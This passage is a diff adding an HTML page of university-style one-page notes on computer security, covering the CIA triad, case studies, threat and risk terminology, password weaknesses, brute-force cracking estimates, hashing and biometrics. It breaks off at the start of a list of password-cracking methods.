@@ -1,0 +1,2787 @@
+<!DOCTYPE html>
+<html lang=" en-US">
+
+<head>
+
+    
+    <meta charset="UTF-8"><script type="text/javascript" async src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML"></script><!-- Include tocNAV javascript -->
+    <script type="text/javascript" src="/assets/js/tocNav.js"></script>
+    
+    <!-- seo used to be here -->
+    <link rel="preconnect" href="https://fonts.gstatic.com">
+    <link rel="preload" href="https://fonts.googleapis.com/css?family=Open+Sans:400,700&display=swap" as="style"
+        type="text/css" crossorigin>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="theme-color" content="#157878">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <link id="mainCS" rel="stylesheet" href="/assets/css/style.css">
+    <title>onePage 141 One Page Notes</title>
+</head>
+
+<body>
+    <div id="mainGrid" class="container">
+        <header style="padding:10px;" class="page-header notes-header" role="banner">
+            
+            
+            <h1 class="project-name">141 One Page Notes</h1>
+        </header>
+        <div title="Table of Contents" class="buttonCol" onclick="toggleNav()">
+            <div class="navArrow">
+                <i></i>
+            </div>
+        </div>
+        <div class="navBox">
+            <div id="sidenav" class="sideNav closedNav">
+                <h2 style="margin-left: 10px;">Table of Contents</h2><ul class="table-of-contents"><li><a href="#introduction-to-computer-security">Introduction to Computer Security</a><ul><li><a href="#2-features-of-computer-security">2 Features of Computer Security</a></li><li><a href="#cia-triangle">CIA Triangle</a></li><li><a href="#case-studies">Case studies</a><ul><li><a href="#malware---the-morris-worm">Malware - The Morris worm</a><ul><li><a href="#worm-vs-virus">Worm vs Virus</a></li></ul></li><li><a href="#denial-of-service---takes-on-georgian-blogger">Denial of service - takes on Georgian blogger</a></li><li><a href="#hacktivism">Hacktivism</a></li><li><a href="#social-engineering">Social engineering</a></li><li><a href="#physical-security">Physical security</a></li></ul></li><li><a href="#basic-terminology">Basic Terminology</a><ul><li><a href="#asset">Asset</a></li><li><a href="#vulnerability">Vulnerability</a></li><li><a href="#threat">Threat</a></li><li><a href="#risk">Risk</a></li><li><a href="#attack">Attack</a></li><li><a href="#countermeasure">Countermeasure</a></li><li><a href="#trust">Trust</a></li></ul></li><li><a href="#risk-analysis">Risk Analysis</a><ul><li><a href="#qualitative-analysis">Qualitative analysis</a><ul><li><a href="#checklist-method">Checklist Method</a></li><li><a href="#mathematical-method">Mathematical Method</a></li></ul></li></ul></li><li><a href="#analysing-security-incidents">Analysing Security Incidents</a></li></ul></li><li><a href="#authentication">Authentication</a><ul><li><a href="#why-authentication">Why Authentication?</a></li><li><a href="#passwords">Passwords</a><ul><li><a href="#the-problem-with-passwords">The Problem with Passwords</a><ul><li><a href="#peoples-tendency-in-setting-passwords">People’s tendency in setting passwords</a></li><li><a href="#user-overload">User Overload</a></li></ul></li></ul></li><li><a href="#password-cracking">Password Cracking</a><ul><li><a href="#cracking-speed">Cracking Speed</a></li><li><a href="#password-strength">Password Strength</a><ul><li><a href="#human-generated-passwords">Human Generated Passwords</a></li></ul></li><li><a href="#password-hashing">Password Hashing</a></li></ul></li><li><a href="#other-authentication-methods">Other Authentication Methods</a></li></ul></li><li><a href="#password-cracking">Password Cracking</a><ul><li><a href="#methods">Methods</a></li><li><a href="#brute-force-and-dictionary-attacks">Brute Force and Dictionary Attacks</a><ul><li><a href="#brute-force-attacks">Brute Force Attacks</a></li><li><a href="#dictionary-attacks">Dictionary attacks</a></li></ul></li><li><a href="#lookup-tables">Lookup Tables</a></li><li><a href="#reverse-lookup-tables">Reverse Lookup Tables</a><ul><li><a href="#hash-chain">Hash Chain</a><ul><li><a href="#how-rlt-saves-space">How RLT saves space</a></li><li><a href="#false-alarms">False Alarms</a></li></ul></li></ul></li><li><a href="#rainbow-table">Rainbow Table</a><ul><li><a href="#cracking-passwords-in-rainbow-table">Cracking passwords in Rainbow Table</a></li></ul></li><li><a href="#defence">Defence</a><ul><li><a href="#password-salt">Password Salt</a><ul><li><a href="#login-verification">Login verification</a></li><li><a href="#how-does-salting-help-defend-against-table-attacks">How does salting help defend against table attacks?</a></li></ul></li></ul></li><li><a href="#how-are-hashes-stored-in-linux">How are hashes stored in Linux?</a><ul><li><a href="#unix-password-protection">Unix password protection</a></li></ul></li></ul></li><li><a href="#cryptography">Cryptography</a><ul><li><a href="#terminology">Terminology</a></li><li><a href="#different-types-of-encryption">Different types of encryption</a></li><li><a href="#encryption-technique-properties">Encryption Technique Properties</a></li><li><a href="#secret-key-encryption">Secret key encryption</a></li><li><a href="#techniques-of-encryption">Techniques of Encryption</a><ul><li><a href="#steganography">Steganography</a><ul><li><a href="#hiding-data-in-an-image">Hiding data in an image</a><ul><li><a href="#lsb-insertion">LSB Insertion</a></li></ul></li></ul></li><li><a href="#code-words">Code Words</a></li><li><a href="#transpositionpermutation-cipher">Transposition/Permutation Cipher</a></li><li><a href="#monoalphabetic-substitution-cipher">Monoalphabetic Substitution Cipher</a></li><li><a href="#polyalphabetic-substitution-cipher">Polyalphabetic Substitution Cipher</a></li><li><a href="#one-time-pad">One time pad</a></li><li><a href="#combining-message-and-key">Combining message and key</a></li></ul></li><li><a href="#data-encryption-standard-des">Data Encryption Standard (DES)</a><ul><li><a href="#fiestal-approach-overview">Fiestal Approach Overview</a></li><li><a href="#the-round-function">The Round Function</a></li><li><a href="#subkey-generation-key-schedule">Subkey Generation (Key Schedule)</a><ul><li><a href="#permuted-choice-1">Permuted Choice 1</a></li><li><a href="#permuted-choice-2">Permuted Choice 2</a></li></ul></li></ul></li><li><a href="#advanced-encryption-standard-aes">Advanced Encryption Standard (AES)</a><ul><li><a href="#sub-operations">Sub-Operations</a><ul><li><a href="#subbytes">SubBytes</a></li><li><a href="#shiftrows">ShiftRows</a></li><li><a href="#mixcolumns">MixColumns</a></li><li><a href="#addroundkey">AddRoundKey</a></li></ul></li><li><a href="#is-aes-secure">Is AES secure?</a></li></ul></li></ul></li><li><a href="#public-key-cryptography">Public Key Cryptography</a><ul><li><a href="#congruence">Congruence</a></li><li><a href="#modular-arithmetic-identities">Modular arithmetic identities</a></li><li><a href="#one-way-function">One Way Function</a></li><li><a href="#the-primitive-root">The Primitive Root</a></li><li><a href="#public-key-encryption">Public Key Encryption</a><ul><li><a href="#rsa-encryption">RSA Encryption</a><ul><li><a href="#how-to-generate-public-key">How to generate public key</a></li><li><a href="#message-encryption">Message Encryption</a></li><li><a href="#how-to-generate-the-private-key">How to generate the private key</a><ul><li><a href="#how-do-we-find-d">How do we find d?</a></li></ul></li><li><a href="#ciphertext-decryption">Ciphertext Decryption</a></li><li><a href="#example-of-rsa">Example of RSA</a></li></ul></li><li><a href="#why-is-rsa-secure">Why is RSA secure?</a></li></ul></li><li><a href="#public-key-vs-secret-key-encryption">Public key vs Secret key Encryption</a></li></ul></li><li><a href="#digital-signature--certificates">Digital Signature &amp; Certificates</a><ul><li><a href="#integrity-authentication--non-repudiation">Integrity, Authentication &amp; Non-repudiation</a></li><li><a href="#digital-signatures-ds">Digital Signatures (DS)</a><ul><li><a href="#differences-between-encryption-and-ds">Differences between Encryption and DS</a></li></ul></li><li><a href="#message-authentication-code-mac">Message Authentication Code (MAC)</a><ul><li><a href="#why-mac">Why MAC?</a></li></ul></li><li><a href="#digital-certificates-ca">Digital Certificates (CA)</a><ul><li><a href="#authentication-through-certificates">Authentication through certificates</a></li><li><a href="#strong-authentication-with-certificate">Strong Authentication with Certificate</a></li><li><a href="#authentication-chain">Authentication Chain</a></li></ul></li><li><a href="#web-of-trust">Web of Trust</a><ul><li><a href="#how-is-validity-determined">How is validity determined?</a></li></ul></li><li><a href="#summary--ca-vs-wot">Summary – CA vs WoT</a></li></ul></li><li><a href="#secure-email">Secure Email</a><ul><li><a href="#how-email-is-delivered">How email is delivered</a></li><li><a href="#general-security-issues-in-emails">General Security Issues in Emails</a><ul><li><a href="#email-servers">Email servers</a></li></ul></li><li><a href="#solutions-to-problems">Solutions to problems</a><ul><li><a href="#spam">Spam</a></li><li><a href="#payloads">Payloads</a></li><li><a href="#spoofing">Spoofing</a></li><li><a href="#interception">Interception</a><ul><li><a href="#pgp-encryption">PGP Encryption</a></li></ul></li></ul></li></ul></li><li><a href="#security--authentication-protocols">Security &amp; Authentication Protocols</a><ul><li><a href="#diffie-hellman-merkel-key-exchange-protocol">Diffie-Hellman-Merkel Key Exchange Protocol</a></li><li><a href="#authentication-protocol">Authentication Protocol</a><ul><li><a href="#replay-attack">Replay Attack</a></li><li><a href="#mutual-authentication">Mutual Authentication</a></li><li><a href="#authentication-with-ds-vs-encryption">Authentication with DS vs Encryption</a></li></ul></li><li><a href="#authentication-spoofing">Authentication Spoofing</a></li><li><a href="#needham-schroeder-secret-key-based-protocol">Needham-Schroeder Secret key-based protocol</a><ul><li><a href="#possible-attack">Possible Attack</a></li></ul></li></ul></li><li><a href="#web-server-security-issues">Web Server Security Issues</a><ul><li><a href="#remote-file-inclusion-rfi-vulnerability">Remote File Inclusion (RFI) Vulnerability</a></li><li><a href="#forms">Forms</a><ul><li><a href="#call-os-commands-in-php">Call OS commands in PHP</a></li></ul></li><li><a href="#path-exploits">Path Exploits</a></li><li><a href="#robot-exclusion-protocol">Robot Exclusion Protocol</a></li><li><a href="#accompanying-resources">Accompanying resources</a><ul><li><a href="#interaction-between-client-and-web-server">Interaction between Client and Web Server</a></li><li><a href="#http-request">HTTP Request</a><ul><li><a href="#http-request-methods">HTTP Request Methods</a></li><li><a href="#how-http-server-process-requests">How HTTP server process requests</a><ul><li><a href="#listening">Listening</a></li><li><a href="#processing">Processing</a></li></ul></li></ul></li><li><a href="#php">PHP</a></li></ul></li></ul></li><li><a href="#virtualization">Virtualization</a><ul><li><a href="#introduction-to-virtualization">Introduction to Virtualization</a><ul><li><a href="#architecture-of-a-physical-machine">Architecture of a Physical Machine</a></li><li><a href="#virtualization-architecture">Virtualization Architecture</a><ul><li><a href="#embedded">Embedded</a></li><li><a href="#non-embedded">Non-embedded</a></li></ul></li><li><a href="#abstract-of-physical-resources">Abstract of Physical Resources</a></li><li><a href="#life-cycles-of-vms">Life cycles of VMs</a></li></ul></li><li><a href="#impact-of-virtualization-on-security">Impact of Virtualization on Security</a><ul><li><a href="#isolated">Isolated</a></li><li><a href="#transient">Transient</a></li><li><a href="#state-restoring">State Restoring</a><ul><li><a href="#security-patches">Security Patches</a></li><li><a href="#data-lifetime">Data Lifetime</a></li></ul></li><li><a href="#low-privilege">Low Privilege</a><ul><li><a href="#security-patch">Security Patch</a></li></ul></li><li><a href="#mobile">Mobile</a></li><li><a href="#easy-to-create">Easy to Create</a></li><li><a href="#lack-of-identity">Lack of Identity</a></li></ul></li><li><a href="#other-security-issues">Other Security Issues</a><ul><li><a href="#hypervisor-intrusion">Hypervisor Intrusion</a></li><li><a href="#security-due-to-inter-vm-communication">Security due to Inter-VM communication</a></li><li><a href="#denial-of-service">Denial of Service</a></li></ul></li></ul></li></ul>
+</div>
+        </div>
+        
+        <div class="contents">
+            <main id="content" class="main-content" role="main">
+                <div class="partNav"><a href="../">🏡Module Home</a></div>
+                <!-- Main Content of markdown or sub-layouts-->
+                <!-- Layout for One Page Notes -->
+<!-- 
+    Works for all modules as long as they 
+    - Are defined in the relevant module data file
+-->
+
+
+
+
+
+<!-- not the best and a little O-horrible  but the easiest way to do it --><h1 id="introduction-to-computer-security">Introduction to Computer Security</h1>
+       
+            <h2 id="2-features-of-computer-security">2 Features of Computer Security</h2>
+
+<p><strong>There is no such thing as absolute computer security.</strong> If we want to know whether a system is secure, there are many questions to ask.</p>
+
+<ul>
+  <li>Security, in which aspects?
+    <ul>
+      <li>Secrecy</li>
+      <li>damage prevention</li>
+      <li>ensure services are available</li>
+    </ul>
+  </li>
+  <li>Security from whom? All people or differentiate users?
+    <ul>
+      <li>It is harder to achieve different levels of security from different users.</li>
+    </ul>
+  </li>
+  <li>Security to what level? Trade off between cost and performance
+    <ul>
+      <li>To achieve a higher level of security</li>
+      <li>more investment</li>
+      <li>more performance degradation</li>
+    </ul>
+  </li>
+</ul>
+
+<blockquote>
+  <p>Part of the reason why there is no 100% security is because there are too many security issues to consider. We can’t achieve 100% – the aim is to <strong>reduce</strong> as much as possible.</p>
+</blockquote>
+
+<p><strong>Theory is not the same as practice.</strong> Security is not just about theory but also:</p>
+
+<ul>
+  <li><strong>Implementation.</strong> How the program is written. Is it accurately implementing theory?</li>
+  <li><strong>Deployment.</strong> Private or public server? How can user input be transferred safely to servers?</li>
+  <li><strong>Maintenance.</strong> Frequent security patches are needed.</li>
+  <li><strong>Parties involved.</strong> Who uses the system and what is their security behaviour? Parties involved have to have secure habits.</li>
+  <li><strong>Location.</strong> Where is the system used? Private or public domain?</li>
+  <li><strong>Temptation.</strong> How tempting is the asset? There will always be black hats trying to attack the system.</li>
+</ul>
+
+<blockquote>
+  <p>Beautiful cryptography can be regularly compromised by bad implementations (human error).</p>
+</blockquote>
+
+<h2 id="cia-triangle">CIA Triangle</h2>
+
+<p>A security model that defines three key aspects that should be guaranteed at all times</p>
+
+<ol>
+  <li><strong>Confidentiality.</strong> No unauthorised disclosure</li>
+  <li><strong>Integrity.</strong> No unauthorised change</li>
+  <li><strong>Availability.</strong> Users are not denied access to resources or have unwarranted delay</li>
+</ol>
+
+<p><img src=".\part1.assets\ciaTriad.png" alt="ciaTriad" /></p>
+
+<p><a href="http://panmore.com/the-cia-triad-confidentiality-integrity-availability">Image source</a></p>
+
+<h2 id="case-studies">Case studies</h2>
+
+<h3 id="malware---the-morris-worm">Malware - The Morris worm</h3>
+
+<p>Robert Morris tried to measure the size of the Internet. The worm could get into a computer through rsh, generate a process and invoke the OS commands to obtain certain information about the network.</p>
+
+<h4 id="worm-vs-virus">Worm vs Virus</h4>
+
+<blockquote>
+  <p><strong>Similarities.</strong> Both self-replicate rapidly and negatively affect a computer.</p>
+
+  <p><strong>Differences.</strong></p>
+
+  <ul>
+    <li>Virus – has to replicate into a host program/other executable code to infect a computer and have an impact</li>
+    <li>Worm – standalone, doesn’t need a host program.</li>
+  </ul>
+</blockquote>
+
+<h3 id="denial-of-service---takes-on-georgian-blogger">Denial of service - takes on Georgian blogger</h3>
+
+<p>Attackers sends a massive number of requests to access the service sites so that the sites are too busy to serve the requests from the genuine users</p>
+
+<h3 id="hacktivism">Hacktivism</h3>
+
+<p>Used as a protest action against governments/institutions.</p>
+
+<p>Anonymous took down US government websites: White House, Department of Justice and FBI. Music sites like Universal Music was targeted too. Coordinated, decentralized, very effective.</p>
+
+<h3 id="social-engineering">Social engineering</h3>
+
+<p>Hacking a system doesn’t involve technical skills</p>
+
+<ul>
+  <li>Happens by exploiting people’s trust</li>
+  <li>Con people into divulging personal info such as passwords
+    <ul>
+      <li>No technical skill, just social skills</li>
+    </ul>
+  </li>
+  <li>Kevin Mitnick - notorious hacker in the 80s to 90s, wrote the Art of Deception book.</li>
+</ul>
+
+<h3 id="physical-security">Physical security</h3>
+
+<p>Russian programmer taken hostage in 2010. People can be threatened, physical locations can be breached, dumpsters can be dived!</p>
+
+<blockquote>
+  <p><strong>This is why we say there is no such thing as 100% Com Sec.</strong></p>
+</blockquote>
+
+<h2 id="basic-terminology">Basic Terminology</h2>
+
+<p>Before we dive into risk analysis methods, we will cover basic terminology in security.</p>
+
+<h3 id="asset">Asset</h3>
+
+<blockquote>
+  <p>Anything we value enough so that we want to protect it</p>
+</blockquote>
+
+<p><strong>Examples</strong>:</p>
+
+<ul>
+  <li>Customer database, web page, source code or executables of programs</li>
+  <li>Laptop, mobile phone, staff, customers, consultants.</li>
+  <li>Company reputation</li>
+</ul>
+
+<h3 id="vulnerability">Vulnerability</h3>
+
+<blockquote>
+  <p>A flaw or weakness in a system’s design, implementation, or operation and management that could be exploited to violate the system’s security policy.</p>
+</blockquote>
+
+<p><strong>Examples</strong>:</p>
+
+<ul>
+  <li>Weak passwords</li>
+  <li>Program bug</li>
+  <li>New employee doesn’t understand the security policy</li>
+</ul>
+
+<h3 id="threat">Threat</h3>
+
+<blockquote>
+  <p>A potential for violation of security, which exists when the attacker has the capability and intention to breach security</p>
+</blockquote>
+
+<p><em>Threat = capability x intent​</em></p>
+
+<p><strong>Examples</strong></p>
+
+<ul>
+  <li>A hacker discovers a new way to exploit a vulnerability and writes a virus</li>
+</ul>
+
+<p>Evaluation models of threat (Microsoft STRIDE)</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Threat</th>
+      <th>Security Aspect</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><strong>Spoofing</strong></td>
+      <td>Authentication</td>
+    </tr>
+    <tr>
+      <td><strong>Tampering</strong></td>
+      <td>Integrity</td>
+    </tr>
+    <tr>
+      <td><strong>Repudiation</strong></td>
+      <td><a href="https://www.cryptomathic.com/products/authentication-signing/digital-signatures-faqs/what-is-non-repudiation">Non-repudiation</a> - the assurance that no one can deny the validity of something (data, service etc.)</td>
+    </tr>
+    <tr>
+      <td><strong>Information disclosure</strong></td>
+      <td>Confidentiality</td>
+    </tr>
+    <tr>
+      <td><strong>Denial of Service</strong></td>
+      <td>Availability</td>
+    </tr>
+    <tr>
+      <td><strong>Elevation of Privilege</strong></td>
+      <td>Authorisation</td>
+    </tr>
+  </tbody>
+</table>
+
+<h3 id="risk">Risk</h3>
+
+<blockquote>
+  <p>An expectation of loss expressed as the <strong>probability</strong> of an actual attack a threat will exploit a vulnerability with a harmful result.</p>
+</blockquote>
+
+<p><em>Risk = probability x harm = threat x vulnerability x harm</em></p>
+
+<p><strong>Example</strong>:</p>
+
+<ul>
+  <li>Risk of your laptop being trampled by an escaped rhino is small</li>
+  <li>Risk of leaving your laptop on the bus could be quite high.</li>
+</ul>
+
+<p>Here is a <a href="https://www.pilgrimsgroup.com/news.php?id=94">case study</a> for analysing the threat and risk.</p>
+
+<h3 id="attack">Attack</h3>
+
+<blockquote>
+  <p>An assault on security that derives from a threat. A threat that has been realised</p>
+</blockquote>
+
+<p><strong>Active attack:</strong> Crashing a website through DOS</p>
+
+<p><strong>Passive attack:</strong> Eavesdrop on the network traffic</p>
+
+<p>Social engineering attack is another type of attack that just requires social skills, no technical skills.</p>
+
+<h3 id="countermeasure">Countermeasure</h3>
+
+<blockquote>
+  <p>An action that reduces a threat, vulnerability, harm, or by eliminating or preventing the attack or by detecting the attack and reacting with corrective action. Anything that will reduce the violation of the security.</p>
+</blockquote>
+
+<p><strong>Examples:</strong></p>
+
+<ul>
+  <li>Prevention: firewall, passwords, encryption, backup, training staff etc.</li>
+  <li>Detection: Intrusion detection system</li>
+  <li>Reaction: Login systems that lock users out after 3 failed attempts.</li>
+</ul>
+
+<h3 id="trust">Trust</h3>
+
+<blockquote>
+  <p>“It is impossible to design a security system that is devoid of trust; we have to trust something. Even the person who writes his own security software has to trust his compiler and computer.”</p>
+
+  <p><em>– Bruce Schneier, Secrets and Lies.</em></p>
+</blockquote>
+
+<p><strong>Trust is used in many contexts, trusted user, trusted third party, trusted host, trusted systems</strong></p>
+
+<ul>
+  <li>Security policy for trusted users will be different than other users</li>
+  <li>Trust relationship limits our responsibility
+    <ul>
+      <li>When we design security mechanism/policy, we will think threat will not come from these trusted entities - so we do not need to think about how to defend against them</li>
+    </ul>
+  </li>
+  <li>Affects our view of threat and thus the countermeasures we employ</li>
+  <li>Trust is also a valuable business asset - it is something that a business would want to protect and maintain.</li>
+</ul>
+
+<h2 id="risk-analysis">Risk Analysis</h2>
+
+<p><strong>Informal risk analysis.</strong></p>
+
+<ul>
+  <li>Identify (value) assets.</li>
+  <li>Identify vulnerabilities</li>
+  <li>Identify threats</li>
+</ul>
+
+<h3 id="qualitative-analysis">Qualitative analysis</h3>
+
+<h4 id="checklist-method">Checklist Method</h4>
+
+<p>Examples: the <strong>DREAD</strong> model by Microsoft:</p>
+
+<p><strong>Damage</strong> - how bad would an attack be?</p>
+
+<p><strong>Reproducibility</strong> - how easy is it to reproduce the attack?</p>
+
+<p><strong>Exploitability</strong> - how easy is it to launch the attack?</p>
+
+<p><strong>Affected users</strong> - how many people will be impacted?</p>
+
+<p><strong>Discoverability</strong> - how easy is it to discover the threat?</p>
+
+<h4 id="mathematical-method">Mathematical Method</h4>
+
+<p>One example of a mathematical method of analysis is <strong>Fault Tree Analysis.</strong></p>
+
+<p>You basically list the possible events that can occur , and list the possible causes of it – until the most basic cause.</p>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># If its listed it represents there is an OR relationship,</span>
+<span class="c1"># otherwise an AND relationship is explicitly stated (last line)</span>
+<span class="c1"># Usually, this is a drawn diagram but I'm lazy.</span>
+<span class="s">Car Won't Start</span><span class="err">:</span>
+  <span class="na">Electrical Fault</span><span class="pi">:</span>
+    <span class="pi">-</span> <span class="s">Broken Wire</span>
+    <span class="pi">-</span> <span class="s">Starter Faulty</span>
+  <span class="na">Control Status</span><span class="pi">:</span>
+    <span class="pi">-</span> <span class="s">Foot on brake &amp; In Park</span>
+</code></pre></div></div>
+
+<p>This can only tell us the probability an attack will occur. Afterwards, we still have to determine the amount of harm that it will cause, and we will get some form of <strong>measurable risk</strong>.</p>
+
+<h2 id="analysing-security-incidents">Analysing Security Incidents</h2>
+
+<p>Key questions to ask are:</p>
+
+<ul>
+  <li>Who is doing it?</li>
+  <li>Motivation</li>
+  <li>What is the damage - which aspect of security is breached?
+    <ul>
+      <li>Not all about divulging secrets</li>
+      <li>Also include DOS, integrity, reputation loss</li>
+    </ul>
+  </li>
+  <li>What should system security encompass?
+    <ul>
+      <li>What elements can be considered to avoid the incident?</li>
+    </ul>
+  </li>
+</ul>
+
+<p><strong>Example of analysis. DoS – Case study 2</strong></p>
+
+<p>Who is doing it? - Russian government allegedly</p>
+
+<p>Motivation? - Prevent criticism</p>
+
+<p>What damage? - Availability</p>
+
+<p>What should system security encompass? - Service provider should have resources available to serve genuine users.</p>
+
+<p><strong>Example of analysis with terminology. Morris Worm.</strong></p>
+
+<p><strong>The Case.</strong> 1988 - Robert Morris exploited a program bug to write a “worm”.</p>
+
+<ul>
+  <li>Considered the first computer “worm” on Internet</li>
+  <li>Not intend to cause damage, but to measure the size of Internet</li>
+  <li>Get into a computer through <strong>rsh</strong>*, generate a process and invoke the OS commands to obtain certain information about the network</li>
+  <li>Gradually slow down the computer to be completely useless</li>
+  <li>Computers on the network can be infected rapidly</li>
+</ul>
+
+<p><strong>Outcome.</strong> Rapidly infected 10% of all machines on the Arpanet. Caused the estimated damage of $100 million.</p>
+
+<p><strong>Analysis.</strong></p>
+
+<ul>
+  <li>Asset: The computers on the Arpanet</li>
+  <li>Vulnerability: rsh comment loophole in Unity OS</li>
+  <li>Threat: Robert has the capability because he discovered the loophole. He had the intent because he wrote the program to make use of the loophole</li>
+  <li>Attack: Robert ran the worm, and it replicated itself rapidly across the Arpanet</li>
+  <li>Risk: (<em>probability x harm</em>) <em>(10% of all machines) x (Money loss)</em> because of computer slowdown.</li>
+  <li>Countermeasure: Robert was charged in court. Applied security patch for the rsh loophole.</li>
+</ul>
+
+            <br/>
+            <hr style="
+                padding: 5px;
+                border-radius: 1em;
+                background-color: whitesmoke;
+            ">
+            <br/><h1 id="authentication">Authentication</h1>
+       
+            <h2 id="why-authentication">Why Authentication?</h2>
+
+<p>The general intention of computer security is to prevent unauthorised access and to ensure authorised users can access systems quickly.</p>
+
+<blockquote>
+  <p>First step of control is to identify who a user is (Identification) and verify this identification (authentication)</p>
+
+  <ul>
+    <li>Identification: Identity by username</li>
+    <li>Authentication: a process of verifying if the users are really who they claim they are</li>
+  </ul>
+</blockquote>
+
+<h2 id="passwords">Passwords</h2>
+
+<blockquote>
+  <p>A basic but very useful authentication method</p>
+
+  <ul>
+    <li>
+      <p>invaluable first line of security defence</p>
+    </li>
+    <li>
+      <p>easy to use and implement</p>
+    </li>
+  </ul>
+</blockquote>
+
+<h3 id="the-problem-with-passwords">The Problem with Passwords</h3>
+
+<ul>
+  <li>Weak passwords (People set weak passwords)</li>
+  <li>People often repeat passwords for different accounts</li>
+  <li>Even if people have good password habits, some sites store passwords in plaintext</li>
+  <li>Some sites allow unlimited login attempts</li>
+  <li>Some sites/systems don’t salt passwords – makes it easy to crack with computers.</li>
+</ul>
+
+<h4 id="peoples-tendency-in-setting-passwords">People’s tendency in setting passwords</h4>
+
+<ul>
+  <li>According to one survey, 12% of employees used “password” as their password</li>
+  <li>Password length is short</li>
+  <li><strong>1/4</strong> of hashed passwords were cracked using a dictionary and combinations of the username.</li>
+  <li>Around 12% use dictionary words</li>
+  <li>81% use alphanumeric passwords</li>
+</ul>
+
+<h4 id="user-overload">User Overload</h4>
+
+<ul>
+  <li>On one hand, we should not set simple passwords but should set different passwords for different accounts</li>
+  <li>On the other hand, we have many different accounts
+    <ul>
+      <li>Microsoft studied users’ password behaviour
+        <ul>
+          <li>The average user has 25 password accounts</li>
+          <li>But the average user has 6.5 different passwords.</li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+</ul>
+
+<blockquote class="extra">
+    Edmund shared an <a href="https://xkcd.com/936/">XKCD</a> the other day that summarises the problem with passwords.
+</blockquote>
+
+<h2 id="password-cracking">Password Cracking</h2>
+
+<p>The time taken to crack a password with brute force depends on the number of combinations,
+\(\text{Let length = L, and character set size = W} \\
+Total \; Combinations= W^{L}\)</p>
+
+<table class="centeredtable">
+  <thead>
+    <tr>
+      <th>Password</th>
+      <th>Combinations (C)</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>26 characters - length 4</td>
+      <td>26<sup>4</sup> = 456,976</td>
+    </tr>
+    <tr>
+      <td>52 characters - length 4</td>
+      <td>52<sup>4</sup> = 7.3 × 10<sup>6</sup></td>
+    </tr>
+    <tr>
+      <td>94 characters - length 8</td>
+      <td>94<sup>8</sup> = 6.1 × 10<sup>15</sup></td>
+    </tr>
+  </tbody>
+</table>
+
+<h3 id="cracking-speed">Cracking Speed</h3>
+
+<p>Indicative speeds using current tools like <strong>hashcat</strong> or <strong>John the Ripper</strong></p>
+
+<table class="centeredtable">
+  <thead>
+    <tr>
+      <th>Hash</th>
+      <th>Using</th>
+      <th>Speed</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>MD5</td>
+      <td>Good PC</td>
+      <td>10<sup>7</sup> guess/second</td>
+    </tr>
+    <tr>
+      <td>SHA256</td>
+      <td>Good PC</td>
+      <td>10<sup>6</sup> g/s</td>
+    </tr>
+    <tr>
+      <td>MD5</td>
+      <td>PC + Graphics Card</td>
+      <td>10<sup>10</sup> g/s</td>
+    </tr>
+    <tr>
+      <td>SHA256</td>
+      <td>PC + Graphics Card</td>
+      <td>10<sup>9</sup> g/s</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>With a GPU cluster, passwords can be cracked even faster – heavily depends on <strong>hardware</strong>.</p>
+
+<p>Expected time to crack a password, \(Time = (Total\; Combinations)/Speed\)</p>
+
+<h3 id="password-strength">Password Strength</h3>
+
+<p>Often expressed as an entropy value, <em>x</em> – the number of bits needed to represent W<sup>L</sup>.</p>
+
+<p>Therefore, \(x = log_2W^L\).</p>
+
+<p><strong>Examples</strong>:</p>
+
+\[Entropy = 2 \times log_226 \approx 2 \times 4.7 = 9\]
+
+\[Entropy = 4 \times log_252 \approx 4\times 5.7 = 22.8\]
+
+<h4 id="human-generated-passwords">Human Generated Passwords</h4>
+
+<p>While entropy measures the “uncertainty” of a password - it is the maximum level of uncertainty. However, humans don’t choose random passwords; they use words or a pattern of characters - much less uncertainty in user-generated password. This leads to some reasons behind certain password cracking techniques like look-up tables, which we will look at in the next chapter.</p>
+
+<h3 id="password-hashing">Password Hashing</h3>
+
+<p>We should never store passwords in plaintext. Instead we store the hash:</p>
+
+<ul>
+  <li>Hash is generated by a one-way hash function</li>
+  <li>Hash function produces a fixed length hash value from the input</li>
+  <li>Hashes are not meant to be reversible. Easy to compute f(x) but very hard to compute x from f(x).
+    <ul>
+      <li>If the input changes by even a bit - the resulting hash should be completely different</li>
+      <li>Hash function types: MD5, SHA256, SHA512 etc…</li>
+    </ul>
+  </li>
+</ul>
+
+<h2 id="other-authentication-methods">Other Authentication Methods</h2>
+
+<p>Passwords are just one way of providing authentication, what other methods are there?</p>
+
+<p><strong>Biometrics.</strong> Does not have a clear cut yes or no - there is room for false negatives or even false positives (which are worse).</p>
+
+<p>Here are some statistics on the various  non-password authentication methods</p>
+
+<table class="centeredtable">
+  <thead>
+    <tr>
+      <th>Biometric</th>
+      <th>False Pos</th>
+      <th>False Negative</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Face</td>
+      <td>1%</td>
+      <td>10%</td>
+    </tr>
+    <tr>
+      <td>Fingerprint</td>
+      <td>1%</td>
+      <td>0.1%</td>
+    </tr>
+    <tr>
+      <td>Hand Geometry</td>
+      <td>2%</td>
+      <td>0.1%</td>
+    </tr>
+    <tr>
+      <td>Iris</td>
+      <td>0.94%</td>
+      <td>0.99%</td>
+    </tr>
+    <tr>
+      <td>Retina</td>
+      <td>0.0001%</td>
+      <td>0.2%</td>
+    </tr>
+    <tr>
+      <td>Keystrokes</td>
+      <td>7%</td>
+      <td>0.1%</td>
+    </tr>
+    <tr>
+      <td>Voices</td>
+      <td>2%</td>
+      <td>10%</td>
+    </tr>
+  </tbody>
+</table>
+
+
+            <br/>
+            <hr style="
+                padding: 5px;
+                border-radius: 1em;
+                background-color: whitesmoke;
+            ">
+            <br/><h1 id="password-cracking">Password Cracking</h1>
+       
+            <h2 id="methods">Methods</h2>
+
+<p>There are a few different methods for cracking a password hash:</p>
+
+<ul>
+  <li>Brute force attack - not the most efficient approach</li>
+  <li>Dictionary attack - tries likely words, short passwords, dictionary lookup. Is likely to have a good chance of success on many systems.</li>
